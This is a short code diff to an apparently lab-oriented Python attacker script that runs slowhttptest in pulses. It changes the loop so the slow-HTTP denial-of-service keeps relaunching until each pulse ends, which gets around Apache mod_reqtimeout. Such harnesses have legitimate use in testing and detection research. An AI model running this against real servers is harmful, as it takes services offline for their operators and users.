@@ -166,7 +166,18 @@ def main():
         while True:
             sys.stderr.write("[attacker] pulse ON\n")
             sys.stderr.flush()
-            run_once(build_cmd(args, duration=args.pulse_on), duration=args.pulse_on)
+            # Hold the pulse for the WHOLE pulse_on. The backend (Apache
+            # mod_reqtimeout) severs slow connections after ~20s and slowhttptest
+            # then exits; without relaunching, a "60s" pulse lasted only ~20s.
+            on_deadline = time.time() + args.pulse_on
+            while True:
+                remaining = int(on_deadline - time.time())
+                if remaining <= 0:
+                    break
+                if not run_once(build_cmd(args, duration=remaining),
+                                duration=remaining):
+                    break          # held the connections until the deadline
+                time.sleep(1)      # exited early: relaunch for the time left
             sys.stderr.write("[attacker] pulse OFF\n")
             sys.stderr.flush()
             time.sleep(args.pulse_off)
